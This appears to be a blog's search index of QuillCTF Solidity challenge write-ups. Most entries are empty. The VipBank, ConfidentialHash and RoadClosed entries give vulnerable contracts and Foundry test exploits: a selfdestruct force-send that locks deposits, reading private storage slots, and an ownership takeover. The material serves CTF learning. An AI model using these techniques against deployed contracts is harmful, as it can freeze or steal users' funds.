<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>QuillCTF-10.Gate</title>
      <link href="/2024/01/22/QuillCTF-10-Gate/"/>
      <url>/2024/01/22/QuillCTF-10-Gate/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> QuillCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-9.WETH10</title>
      <link href="/2024/01/22/QuillCTF-9-WETH10/"/>
      <url>/2024/01/22/QuillCTF-9-WETH10/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> QuillCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-8.Pelusa</title>
      <link href="/2024/01/22/QuillCTF-8-Pelusa/"/>
      <url>/2024/01/22/QuillCTF-8-Pelusa/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> QuillCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-7.TrueXOR</title>
      <link href="/2024/01/22/QuillCTF-7-TrueXOR/"/>
      <url>/2024/01/22/QuillCTF-7-TrueXOR/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> QuillCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-6.Collatzpuzzle</title>
      <link href="/2024/01/22/QuillCTF-6-Collatzpuzzle/"/>
      <url>/2024/01/22/QuillCTF-6-Collatzpuzzle/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> QuillCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-5.D31eg4t3</title>
      <link href="/2024/01/22/QuillCTF-5-D31eg4t3/"/>
      <url>/2024/01/22/QuillCTF-5-D31eg4t3/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> QuillCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-4.SafeNft</title>
      <link href="/2024/01/22/QuillCTF-4-SafeNft/"/>
      <url>/2024/01/22/QuillCTF-4-SafeNft/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> QuillCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-3.VipBank</title>
      <link href="/2024/01/22/QuillCTF-3-VipBank/"/>
      <url>/2024/01/22/QuillCTF-3-VipBank/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“This Bank is only for its VIP Customers.”</span><br></pre></td></tr></table></figure><h2 id="Objective"><a href="#Objective" class="headerlink" title="Objective"></a>Objective</h2><ul><li>At any cost, lock the VIP user balance forever into the contract.</li></ul><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.7;</span><br><span class="line"></span><br><span class="line">contract VIP_Bank&#123;</span><br><span class="line"></span><br><span class="line">    address public manager;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line">    mapping(address =&gt; bool) public VIP;</span><br><span class="line">    uint public maxETH = 0.5 ether;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        manager = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyManager() &#123;</span><br><span class="line">        require(msg.sender == manager , &quot;you are not manager&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyVIP() &#123;</span><br><span class="line">        require(VIP[msg.sender] == true, &quot;you are not our VIP customer&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addVIP(address addr) public onlyManager &#123;</span><br><span class="line">        VIP[addr] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable onlyVIP &#123;</span><br><span class="line">        require(msg.value &lt;= 0.05 ether, &quot;Cannot deposit more than 0.05 ETH per transaction&quot;);</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint _amount) public onlyVIP &#123;</span><br><span class="line">        require(address(this).balance &lt;= maxETH, &quot;Cannot withdraw more than 0.5 ETH per transaction&quot;);</span><br><span class="line">        require(balances[msg.sender] &gt;= _amount, &quot;Not enough ether&quot;);</span><br><span class="line">        balances[msg.sender] -= _amount;</span><br><span class="line">        (bool success,) = payable(msg.sender).call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Withdraw Failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function contractBalance() public view returns (uint)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity 0.8.7;import &quot;forge-std/Test.sol&quot;;import &quot;../src/3-VipBank/Bank.sol&quot;;contract Attack &#123;    address public target;    constructor(address _target) &#123;        target = _target;    &#125;    receive() external payable &#123;&#125;    function exp() public &#123;        selfdestruct(payable(target));    &#125;&#125;contract BankTest is Test &#123;    VIP_Bank target;    address admin;    address attacker;    address customer;    function setUp() public &#123;        admin = makeAddr(&quot;admin&quot;);        attacker = makeAddr(&quot;attacker&quot;);        customer = makeAddr(&quot;customer&quot;);        vm.deal(attacker, 10 ether);        vm.deal(customer, 10 ether);        vm.startPrank(admin);        target = new VIP_Bank();        target.addVIP(customer);        vm.stopPrank();    &#125;    function att() public &#123;        vm.startPrank(customer);        target.deposit&#123;value: 0.05 ether&#125;();        vm.stopPrank();        vm.startPrank(attacker);        assertEq(0.05 ether, target.contractBalance());        Attack attack = new Attack(address(target));        payable(attack).transfer(1 ether);        attack.exp();        vm.stopPrank();        assertEq(target.contractBalance(), 1.05 ether);        vm.startPrank(customer);        vm.expectRevert();        target.withdraw(0.05 ether);    &#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> QuillCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-2.ConfidentialHash</title>
      <link href="/2024/01/22/QuillCTF-2-ConfidentialHash/"/>
      <url>/2024/01/22/QuillCTF-2-ConfidentialHash/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“Private doesn’t mean confidential”</span><br></pre></td></tr></table></figure><h2 id="Objective"><a href="#Objective" class="headerlink" title="Objective"></a>Objective</h2><ul><li>Find the keccak256 hash of aliceHash and bobHash.</li></ul><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.7;</span><br><span class="line"></span><br><span class="line">contract Confidential &#123;</span><br><span class="line">    string public firstUser = &quot;ALICE&quot;;</span><br><span class="line">    uint public alice_age = 24;</span><br><span class="line">bytes32 private ALICE_PRIVATE_KEY; //Super Secret Key</span><br><span class="line">    bytes32 public ALICE_DATA = &quot;QWxpY2UK&quot;;</span><br><span class="line">    bytes32 private aliceHash = hash(ALICE_PRIVATE_KEY, ALICE_DATA);</span><br><span class="line"></span><br><span class="line">    string public secondUser = &quot;BOB&quot;;</span><br><span class="line">    uint public bob_age = 21;</span><br><span class="line">    bytes32 private BOB_PRIVATE_KEY; // Super Secret Key</span><br><span class="line">    bytes32 public BOB_DATA = &quot;Qm9iCg&quot;;</span><br><span class="line">    bytes32 private bobHash = hash(BOB_PRIVATE_KEY, BOB_DATA);</span><br><span class="line"></span><br><span class="line">constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function hash(bytes32 key1, bytes32 key2) public pure returns (bytes32) &#123;</span><br><span class="line">        return keccak256(abi.encodePacked(key1, key2));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function checkthehash(bytes32 _hash) public view returns(bool)&#123;</span><br><span class="line">        require (_hash == hash(aliceHash, bobHash));</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>Read the storage</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">string public firstUser = &quot;ALICE&quot;; //0</span><br><span class="line">    uint256 public alice_age = 24; //1</span><br><span class="line">    bytes32 private ALICE_PRIVATE_KEY; //Super Secret Key//2</span><br><span class="line">    bytes32 public ALICE_DATA = &quot;QWxpY2UK&quot;; //3</span><br><span class="line">    bytes32 private aliceHash = hash(ALICE_PRIVATE_KEY, ALICE_DATA); //4</span><br><span class="line"></span><br><span class="line">    string public secondUser = &quot;BOB&quot;; //5</span><br><span class="line">    uint256 public bob_age = 21; //6</span><br><span class="line">    bytes32 private BOB_PRIVATE_KEY; // Super Secret Key//7</span><br><span class="line">    bytes32 public BOB_DATA = &quot;Qm9iCg&quot;; //8</span><br><span class="line">    bytes32 private bobHash = hash(BOB_PRIVATE_KEY, BOB_DATA); //9</span><br></pre></td></tr></table></figure><p>or use forge inspect</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">-&gt; % forge inspect Confidential storage           </span><br><span class="line">&#123;</span><br><span class="line">  &quot;storage&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45010,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;firstUser&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_string_storage&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45013,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;alice_age&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;1&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_uint256&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45015,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;ALICE_PRIVATE_KEY&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;2&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_bytes32&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45018,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;ALICE_DATA&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;3&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_bytes32&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45024,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;aliceHash&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;4&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_bytes32&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45027,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;secondUser&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;5&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_string_storage&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45030,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;bob_age&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;6&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_uint256&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45032,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;BOB_PRIVATE_KEY&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;7&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_bytes32&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45035,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;BOB_DATA&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;8&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_bytes32&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45041,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;bobHash&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;9&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_bytes32&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;types&quot;: &#123;</span><br><span class="line">    &quot;t_bytes32&quot;: &#123;</span><br><span class="line">      &quot;encoding&quot;: &quot;inplace&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;bytes32&quot;,</span><br><span class="line">      &quot;numberOfBytes&quot;: &quot;32&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;t_string_storage&quot;: &#123;</span><br><span class="line">      &quot;encoding&quot;: &quot;bytes&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;string&quot;,</span><br><span class="line">      &quot;numberOfBytes&quot;: &quot;32&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;t_uint256&quot;: &#123;</span><br><span class="line">      &quot;encoding&quot;: &quot;inplace&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;uint256&quot;,</span><br><span class="line">      &quot;numberOfBytes&quot;: &quot;32&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><ul><li>Use load Cheatcode</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/2-Hash/Hash.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract testCon is Test, Confidential &#123;</span><br><span class="line">    Confidential challenge;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        challenge = new Confidential();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testConfidential() public &#123;</span><br><span class="line">        bytes32 aliceHash = vm.load(address(challenge), bytes32(uint256(4)));</span><br><span class="line">        bytes32 bobHash = vm.load(address(challenge), bytes32(uint256(9)));</span><br><span class="line">        bytes32 hash_value = challenge.hash(aliceHash, bobHash);</span><br><span class="line"></span><br><span class="line">        bool isOK = challenge.checkthehash(hash_value);</span><br><span class="line">        assert(isOK == true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> QuillCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-1.RoadClosed</title>
      <link href="/2024/01/22/QuillCTF-1-RoadClosed/"/>
      <url>/2024/01/22/QuillCTF-1-RoadClosed/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“We keep out the wrong people – by letting anyone in.”</span><br></pre></td></tr></table></figure><h2 id="Objective"><a href="#Objective" class="headerlink" title="Objective"></a>Objective</h2><ol><li>Become the owner of the contract</li><li>Change the value of hacked to true</li></ol><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.7;</span><br><span class="line"></span><br><span class="line">contract RoadClosed &#123;</span><br><span class="line"></span><br><span class="line">    bool hacked;</span><br><span class="line">    address owner;</span><br><span class="line">address pwner;</span><br><span class="line">    mapping(address =&gt; bool) whitelistedMinters;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function isContract(address addr) public view returns (bool) &#123;</span><br><span class="line">        uint size;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            size := extcodesize(addr)</span><br><span class="line">            &#125;</span><br><span class="line">        return size &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isOwner() public view returns(bool)&#123;</span><br><span class="line">        if (msg.sender==owner) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        else return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addToWhitelist(address addr) public &#123;</span><br><span class="line">        require(!isContract(addr),&quot;Contracts are not allowed&quot;);</span><br><span class="line">        whitelistedMinters[addr] = true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    function changeOwner(address addr) public &#123;</span><br><span class="line">        require(whitelistedMinters[addr], &quot;You are not whitelisted&quot;);</span><br><span class="line">require(msg.sender == addr, &quot;address must be msg.sender&quot;);</span><br><span class="line">        require(addr != address(0), &quot;Zero address&quot;);</span><br><span class="line">        owner = addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn(address addr) external payable&#123;</span><br><span class="line">        require(!isContract(msg.sender), &quot;Contracts are not allowed&quot;);</span><br><span class="line">require(msg.sender == addr, &quot;address must be msg.sender&quot;);</span><br><span class="line">        require (msg.sender == owner, &quot;Must be owner&quot;);</span><br><span class="line">        hacked = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn() external payable &#123;</span><br><span class="line">        require(msg.sender == pwner);</span><br><span class="line">        hacked = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isHacked() public view returns(bool) &#123;</span><br><span class="line">        return hacked;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>Just call function one by one.</p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: SEE LICENSE IN LICENSE</span><br><span class="line">pragma solidity 0.8.7;</span><br><span class="line"></span><br><span class="line">import &quot;../src/1-RoadClosed/roadclosed.sol&quot;;</span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract RoadClosedTest is Test &#123;</span><br><span class="line">    RoadClosed challenge;</span><br><span class="line"></span><br><span class="line">    address public deployer;</span><br><span class="line">    address public pwner;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.startPrank(deployer);</span><br><span class="line">        challenge = new RoadClosed();</span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        pwner = makeAddr(&quot;0xdeadbeef&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testOwner() public &#123;</span><br><span class="line">        vm.startPrank(deployer);</span><br><span class="line">        assertEq(challenge.isOwner(), true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testStatus() public &#123;</span><br><span class="line">        vm.startPrank(pwner);</span><br><span class="line">        assertEq(challenge.isHacked(), false);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testAttack() public &#123;</span><br><span class="line">        vm.startPrank(pwner);</span><br><span class="line">        challenge.addToWhitelist(pwner);</span><br><span class="line">        challenge.changeOwner(pwner);</span><br><span class="line">        challenge.pwn(pwner);</span><br><span class="line">        assertEq(challenge.isHacked(), true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> QuillCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>About_FlashLoans</title>
      <link href="/2024/01/18/About-FlashLoans/"/>
      <url>/2024/01/18/About-FlashLoans/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-Season1</title>
      <link href="/2024/01/15/QuillCTF-Season1/"/>
      <url>/2024/01/15/QuillCTF-Season1/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Road-Closed"><a href="#1-Road-Closed" class="headerlink" title="1-Road-Closed"></a>1-Road-Closed</h1>]]></content>
      
      
      
        <tags>
            
            <tag> Solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Opcode-EVM_PUZZLES</title>
